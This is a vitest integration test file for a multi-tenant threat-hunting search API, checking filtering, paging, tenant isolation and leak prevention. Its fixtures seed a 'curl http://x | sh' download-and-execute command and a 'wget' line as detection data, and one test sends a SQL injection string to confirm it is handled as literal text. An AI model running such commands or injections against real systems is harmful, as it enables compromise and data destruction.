import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { NextRequest } from "next/server";
import { Prisma, PrismaClient } from "@prisma/client";
import { cleanDatabase, createTestAgent, createTestDetection, createTestTenant, prisma } from "../helpers/db";
import { createTenantHeaders } from "../helpers/http";
import { POST as searchRoute } from "@/app/api/hunts/search/route";
import { GET as matchesRoute } from "@/app/api/hunts/[id]/matches/route";
import {
  MAX_CONCURRENT_SEARCHES_PER_TENANT,
  SEARCH_PAGE_SIZE,
  searchWithinLimit,
  type DetectionRow,
  type SearchPage,
  type SearchRequest,
} from "@/lib/hunt-search";

const HOUR = 3_600_000;
const huntQuery = { version: 1 as const, lastHours: 24 };

function post(tenantId: string, body: unknown) {
  return new NextRequest("http://localhost/api/hunts/search", {
    method: "POST",
    headers: createTenantHeaders(tenantId, "analyst-1"),
    body: JSON.stringify(body),
  });
}
const ids = (page: SearchPage) => page.rows.map((r) => r.id);
const detectionRows = (page: SearchPage) => page.rows as DetectionRow[];

async function run(tenantId: string, request: SearchRequest, client: PrismaClient = prisma): Promise<SearchPage> {
  const outcome = await searchWithinLimit(client, tenantId, request);
  if (outcome.status !== "ok") throw new Error("busy");
  return outcome.page;
}

describe("ad-hoc search over detections and cases (real database)", () => {
  beforeEach(async () => {
    await cleanDatabase();
  });
  afterAll(async () => {
    await cleanDatabase();
    await prisma.$disconnect();
  });

  it("finds detections by window, technique, severity, host and text, newest first, never another tenant's", async () => {
    const tenant = await createTestTenant();
    const other = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    const b = await createTestAgent(tenant.id);
    const now = Date.now();
    const newest = await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - HOUR), meta: { title: "Encoded PowerShell" }, event: { cmdline: "curl http://x | sh" } });
    const older = await createTestDetection(tenant.id, a.id, { technique: "T1059.004", severity: "low", timestamp: new Date(now - 2 * HOUR), event: { cmdline: "ls" } });
    await createTestDetection(tenant.id, b.id, { technique: "T1105", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "wget x" } });
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001", timestamp: new Date(now - 30 * HOUR) });
    const foreign = await createTestAgent(other.id);
    await createTestDetection(other.id, foreign.id, { technique: "T1059.001" });

    const all = await run(tenant.id, { source: "detections", query: huntQuery });
    expect(all.total).toBe(3);
    expect(detectionRows(all).map((r) => r.timestamp)).toEqual([...detectionRows(all).map((r) => r.timestamp)].sort().reverse());

    const byTechnique = await run(tenant.id, { source: "detections", query: { ...huntQuery, techniques: ["T1059"] } });
    expect(ids(byTechnique).sort()).toEqual([newest.id, older.id].sort());
    expect((await run(tenant.id, { source: "detections", query: { ...huntQuery, techniques: ["T1059.004"] } })).total).toBe(1);
    expect((await run(tenant.id, { source: "detections", query: { ...huntQuery, severities: ["high"] } })).total).toBe(2);
    expect(ids(await run(tenant.id, { source: "detections", query: { ...huntQuery, agentIds: [b.id] } }))).toHaveLength(1);
    const byText = await run(tenant.id, { source: "detections", query: { ...huntQuery, text: "CURL http" } });
    expect(byText.rows).toMatchObject([{ id: newest.id, title: "Encoded PowerShell", technique: "T1059.001", agentId: a.id }]);
    expect((await run(tenant.id, { source: "detections", query: { ...huntQuery, lastHours: 48 } })).total).toBe(4);
  });

  it("gives the title of a rule and the title of the case a detection was grouped into, and nothing else of the event", async () => {
    const tenant = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    const grouped = await prisma.case.create({ data: { tenantId: tenant.id, title: "T1059 activity", severity: "high", status: "open" } });
    await createTestDetection(tenant.id, agent.id, { caseId: grouped.id, meta: { title: "Encoded PowerShell" }, event: { cmdline: "secret-token-123" } });
    await createTestDetection(tenant.id, agent.id, { event: { cmdline: "no title here" } });

    const page = await run(tenant.id, { source: "detections", query: huntQuery });

    expect(page.rows).toHaveLength(2);
    const withCase = detectionRows(page).find((r) => r.caseId === grouped.id);
    expect(withCase).toMatchObject({ caseTitle: "T1059 activity", title: "Encoded PowerShell" });
    expect(detectionRows(page).find((r) => r.caseId === null)).toMatchObject({ caseTitle: null, title: null });
    expect(JSON.stringify(page)).not.toContain("secret-token-123");
  });

  // `parseDetectionPayload` stores a structured detection's title in `meta.title` and its first
  // triggering event in `event`: the rule title is the first, never a field of the second (ADR-0025
  // point 9). The seeds below use that storage layout, with a different, sensitive `event.title`.
  it("returns the rule title from meta and never the event's own title field", async () => {
    const tenant = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    const rule = await createTestDetection(tenant.id, agent.id, {
      meta: { title: "Encoded PowerShell", source: { engine: "sigma" } },
      event: { title: "event-title-with-secret-ABC123", cmdline: "secret-token-123" },
    });
    // An event that carries a `title` and a detection whose meta has none: no rule title, and
    // the event's value does not stand in for it.
    const untitled = await createTestDetection(tenant.id, agent.id, {
      meta: { source: { engine: "sigma" } },
      event: { title: "event-title-only-DEF456" },
    });
    // A meta title that is not a string is not a title.
    const odd = await createTestDetection(tenant.id, agent.id, {
      meta: { title: { nested: "object-title-GHI789" } },
      event: { title: "event-title-for-odd-JKL012" },
    });

    const page = await run(tenant.id, { source: "detections", query: huntQuery });

    const byId = (id: string) => detectionRows(page).find((r) => r.id === id);
    expect(byId(rule.id)?.title).toBe("Encoded PowerShell");
    expect(byId(untitled.id)?.title).toBeNull();
    expect(byId(odd.id)?.title).toBeNull();
    const wire = JSON.stringify(page);
    for (const leaked of ["event-title-with-secret-ABC123", "event-title-only-DEF456", "event-title-for-odd-JKL012", "object-title-GHI789", "secret-token-123"]) {
      expect(wire).not.toContain(leaked);
    }
  });

  it("cuts a long rule title from meta at the row limit", async () => {
    const tenant = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, agent.id, { meta: { title: "x".repeat(500) } });

    const page = await run(tenant.id, { source: "detections", query: huntQuery });

    expect(detectionRows(page)[0].title).toBe("x".repeat(200));
  });

  it("pages through every match exactly once with a non-UTC database session, also when many share one timestamp", async () => {
    const tenant = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    const now = Date.now();
    const base = now - HOUR;
    const created: string[] = [];
    for (let i = 0; i < 60; i++) created.push((await createTestDetection(tenant.id, agent.id, { timestamp: new Date(base) })).id);
    for (let i = 0; i < 45; i++) created.push((await createTestDetection(tenant.id, agent.id, { timestamp: new Date(base - (i + 1) * 1000) })).id);

    const testUrl = new URL(process.env.DATABASE_URL!);
    testUrl.searchParams.set("connection_limit", "1");
    const nonUtcClient = new PrismaClient({ datasources: { db: { url: testUrl.toString() } } });
    try {
      await nonUtcClient.$executeRawUnsafe("SET TIME ZONE 'Europe/Paris'");
      const [{ zone }] = await nonUtcClient.$queryRaw<{ zone: string }[]>(Prisma.sql`SELECT current_setting('TimeZone') AS zone`);
      expect(zone).toBe("Europe/Paris");

      const seen: string[] = [];
      let cursor: string | undefined;
      const sizes: number[] = [];
      const totals: (number | null)[] = [];
      do {
        const page = await run(tenant.id, { source: "detections", query: huntQuery, cursor }, nonUtcClient);
        if (cursor) expect(page.nextCursor).not.toBe(cursor);
        seen.push(...ids(page));
        sizes.push(page.rows.length);
        totals.push(page.total);
        cursor = page.nextCursor ?? undefined;
      } while (cursor);

      expect(sizes).toEqual([SEARCH_PAGE_SIZE, SEARCH_PAGE_SIZE, 105 - 2 * SEARCH_PAGE_SIZE]);
      expect(totals).toEqual([105, null, null]);
      expect(new Set(seen).size).toBe(105);
      expect([...seen].sort()).toEqual([...created].sort());

      await prisma.case.createMany({
        data: Array.from({ length: SEARCH_PAGE_SIZE + 5 }, (_, i) => ({
          tenantId: tenant.id, title: `case ${i}`, severity: "high", status: "open", createdAt: new Date(base),
        })),
      });
      const caseQuery = { kind: "cases" as const, version: 1 as const, lastHours: 24 };
      const first = await run(tenant.id, { source: "cases", query: caseQuery }, nonUtcClient);
      const second = await run(tenant.id, { source: "cases", query: caseQuery, cursor: first.nextCursor! }, nonUtcClient);
      expect([first.rows.length, second.rows.length]).toEqual([SEARCH_PAGE_SIZE, 5]);
      expect(new Set([...ids(first), ...ids(second)]).size).toBe(SEARCH_PAGE_SIZE + 5);
      expect(second.nextCursor).toBeNull();

      await createTestDetection(tenant.id, agent.id, { technique: "T1486", timestamp: new Date(now - 23 * HOUR) });
      await createTestDetection(tenant.id, agent.id, { technique: "T1486", timestamp: new Date(now - 25 * HOUR) });
      expect((await run(tenant.id, { source: "detections", query: { ...huntQuery, techniques: ["T1486"] } }, nonUtcClient)).total).toBe(1);
      await prisma.case.createMany({
        data: [23, 25].map((hours) => ({
          tenantId: tenant.id, title: `edge ${hours}`, severity: "high", status: "investigating", createdAt: new Date(now - hours * HOUR),
        })),
      });
      expect((await run(tenant.id, { source: "cases", query: { ...caseQuery, statuses: ["investigating"] } }, nonUtcClient)).total).toBe(1);
    } finally {
      await nonUtcClient.$disconnect();
    }
  });

  it("finds cases by window, severity, status, technique of a detection and text, with their detection count", async () => {
    const tenant = await createTestTenant();
    const other = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    const now = Date.now();
    const mk = (extra: Record<string, unknown>) =>
      prisma.case.create({
        data: { tenantId: tenant.id, title: "case", severity: "high", status: "open", ...extra } as Prisma.CaseUncheckedCreateInput,
      });
    const ransom = await mk({ title: "Ransomware on host-7", description: "encrypts 100%_of files", severity: "critical", status: "investigating" });
    const quiet = await mk({ title: "Port scan", severity: "low", status: "resolved" });
    const old = await mk({ title: "Old one", createdAt: new Date(now - 100 * HOUR) });
    await createTestDetection(tenant.id, agent.id, { caseId: ransom.id, technique: "T1486" });
    await createTestDetection(tenant.id, agent.id, { caseId: ransom.id, technique: "T1059.001" });
    await createTestDetection(tenant.id, agent.id, { caseId: quiet.id, technique: "T1046" });
    await prisma.case.create({ data: { tenantId: other.id, title: "Ransomware elsewhere", severity: "high", status: "open" } });

    const q = { kind: "cases" as const, version: 1 as const, lastHours: 48 };
    const all = await run(tenant.id, { source: "cases", query: q });
    expect(all.total).toBe(2);
    expect(all.rows.find((r) => r.id === ransom.id)).toMatchObject({ detectionCount: 2, severity: "critical", status: "investigating" });
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, lastHours: 200 } }))).toContain(old.id);
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, statuses: ["resolved"] } }))).toEqual([quiet.id]);
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, severities: ["critical"] } }))).toEqual([ransom.id]);
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, techniques: ["T1059"] } }))).toEqual([ransom.id]);
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, techniques: ["T1046"] } }))).toEqual([quiet.id]);
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, text: "RANSOMWARE" } }))).toEqual([ransom.id]);
    // `%` and `_` in the text are literal, not wildcards, and the description is searched too.
    expect(ids(await run(tenant.id, { source: "cases", query: { ...q, text: "100%_of" } }))).toEqual([ransom.id]);
    expect((await run(tenant.id, { source: "cases", query: { ...q, text: "100%x" } })).total).toBe(0);
  });

  it("does not count another tenant's detections in a case's technique match or detection count", async () => {
    const tenant = await createTestTenant();
    const other = await createTestTenant();
    const mine = await prisma.case.create({ data: { tenantId: tenant.id, title: "mine", severity: "high", status: "open" } });
    const theirAgent = await createTestAgent(other.id);
    // A detection of another tenant pointing at this tenant's case id must not count for it.
    await createTestDetection(other.id, theirAgent.id, { caseId: mine.id, technique: "T1486" });

    const q = { kind: "cases" as const, version: 1 as const, lastHours: 24 };
    expect((await run(tenant.id, { source: "cases", query: { ...q, techniques: ["T1486"] } })).total).toBe(0);
    expect((await run(tenant.id, { source: "cases", query: q })).rows[0]).toMatchObject({ id: mine.id, detectionCount: 0 });
  });

  it("answers over the API: a page, 400 for a bad body or cursor, and the text is a literal", async () => {
    const tenant = await createTestTenant();
    const agent = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, agent.id, { event: { cmdline: "echo 100%_done" } });
    await createTestDetection(tenant.id, agent.id, { event: { cmdline: "echo 1000 done" } });

    const ok = await searchRoute(post(tenant.id, { query: { ...huntQuery, text: "100%_done" } }));
    expect(ok.status).toBe(200);
    expect(await ok.json()).toMatchObject({ source: "detections", total: 1, nextCursor: null });
    const injected = await searchRoute(post(tenant.id, { query: { ...huntQuery, text: "'; DROP TABLE detections; --" } }));
    expect(injected.status).toBe(200);
    expect((await injected.json()).total).toBe(0);
    expect(await prisma.detection.count()).toBe(2);

    for (const body of [
      { query: { ...huntQuery, lastHours: 0 } },
      { query: huntQuery, tenantId: "someone-else" },
      { source: "events", query: huntQuery },
      { query: huntQuery, cursor: "garbage" },
      { source: "cases", query: huntQuery },
    ]) {
      expect((await searchRoute(post(tenant.id, body))).status, JSON.stringify(body)).toBe(400);
    }
    const noJson = await searchRoute(new NextRequest("http://localhost/api/hunts/search", { method: "POST", headers: createTenantHeaders(tenant.id, "u"), body: "{" }));
    expect(noJson.status).toBe(400);
  });

  it("refuses a search beyond the tenant's concurrent allowance, frees it afterwards, and leaves other tenants alone", async () => {
    const tenant = await createTestTenant();
    const other = await createTestTenant();
    const slow = (t: string) =>
      searchWithinLimit(prisma, t, { source: "detections", query: huntQuery }, new Date(), {
        beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT pg_sleep(1.5)`),
      });

    const inFlight = Array.from({ length: MAX_CONCURRENT_SEARCHES_PER_TENANT }, () => slow(tenant.id));
    // Let both take their lock before the next one asks.
    await new Promise((resolve) => setTimeout(resolve, 600));

    expect(await searchWithinLimit(prisma, tenant.id, { source: "detections", query: huntQuery })).toEqual({ status: "busy" });
    const res = await searchRoute(post(tenant.id, { query: huntQuery }));
    expect(res.status).toBe(429);
    expect(res.headers.get("Retry-After")).toBe("5");
    expect((await searchWithinLimit(prisma, other.id, { source: "detections", query: huntQuery })).status).toBe("ok");

    for (const outcome of await Promise.all(inFlight)) expect(outcome.status).toBe("ok");
    expect((await searchWithinLimit(prisma, tenant.id, { source: "detections", query: huntQuery })).status).toBe("ok");
  });

  it("cancels a search over its time limit, frees its slot, and answers 504 over the API", async () => {
    const tenant = await createTestTenant();
    await expect(
      searchWithinLimit(prisma, tenant.id, { source: "detections", query: huntQuery }, new Date(), {
        statementTimeoutMs: 100,
        beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT pg_sleep(2)`),
      })
    ).rejects.toThrow(/statement timeout/i);
    expect((await searchWithinLimit(prisma, tenant.id, { source: "detections", query: huntQuery })).status).toBe("ok");
  });

  describe("GET /api/hunts/[id]/matches", () => {
    const get = (tenantId: string, id: string, qs = "") =>
      matchesRoute(
        new NextRequest(`http://localhost/api/hunts/${id}/matches${qs}`, { headers: createTenantHeaders(tenantId, "analyst-1") }),
        { params: { id } }
      );

    it("lists what the hunt's query matches now, without recording a run, and 404s another tenant's hunt", async () => {
      const tenant = await createTestTenant();
      const other = await createTestTenant();
      const agent = await createTestAgent(tenant.id);
      const hit = await createTestDetection(tenant.id, agent.id, { technique: "T1059.001" });
      await createTestDetection(tenant.id, agent.id, { technique: "T1105" });
      const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "analyst-1", name: "ps", query: { ...huntQuery, techniques: ["T1059"] } } });

      const res = await get(tenant.id, hunt.id);
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({ total: 1, rows: [{ id: hit.id }] });
      expect(await prisma.huntRun.count()).toBe(0);

      expect((await get(other.id, hunt.id)).status).toBe(404);
      expect((await get(tenant.id, hunt.id, "?cursor=garbage")).status).toBe(400);
    });

    it("answers 422 for a stored query that no longer parses", async () => {
      const tenant = await createTestTenant();
      const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "a", name: "old", query: { version: 99, lastHours: 2 } } });
      const res = await get(tenant.id, hunt.id);
      expect(res.status).toBe(422);
      expect(await res.json()).toEqual({ error: "The hunt's stored query no longer parses; edit the hunt first" });
    });
  });
});
